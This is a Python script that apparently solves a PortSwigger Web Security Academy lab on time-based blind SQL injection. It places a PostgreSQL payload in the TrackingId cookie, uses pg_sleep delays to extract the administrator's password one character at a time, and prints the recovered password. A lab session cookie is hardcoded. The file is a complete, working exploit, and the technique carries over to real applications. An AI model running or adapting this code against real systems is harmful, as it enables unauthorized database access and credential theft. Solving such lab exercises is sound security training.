import requests
from itertools import chain
from datetime import timedelta

class AlphabetListing:

    def __iter__(self):
        self.character = 'a'
        return self
    
    def __next__(self) -> str:
        if self.character > 'z':
            raise StopIteration
        else:
            character = self.character 
            self.character = chr(ord(self.character) + 1)
            return character

class NumberListing:

    def __iter__(self):
        self.number = 0
        return self

    def __next__(self) -> int:
        if self.number > 9:
            raise StopIteration
        else:
            number = self.number
            self.number += 1
            return str(number)

def construct_query(number: int,character: str) -> str:
    return f'a\'%3b+SELECT+CASE+WHEN+EXISTS+(SELECT+*+FROM+users+WHERE+username=\'administrator\'+AND+SUBSTRING(password,{number},1)+LIKE+\'{character}\')+THEN+pg_sleep(5)+ELSE+\'A\'+END%3b+--+-'

if __name__ == '__main__':

    url = 'https://0a5e00dd0341f8448011e4c2008b00c6.web-security-academy.net'
    jar = requests.cookies.RequestsCookieJar()

    jar.set('session','SSNCi3rQ8PO0cirqyy7hCDVm1SBEZOUV')

    time_limit = timedelta(seconds = 4)

    password = ''

    for i in range(20):
        for character in chain(AlphabetListing(),NumberListing()):
            query = construct_query(i+1,character)
            jar.set('TrackingId',query)

            response = requests.get(url,cookies = jar)

            print(query)
            print(response.elapsed)
            print(time_limit)
            print(response.elapsed > time_limit)

            if response.elapsed > time_limit:
                print(f'Discovered character {character}')
                password += character
                break
        print(f'Done with the {i} loop')

    print(f'Final password is {password}')


        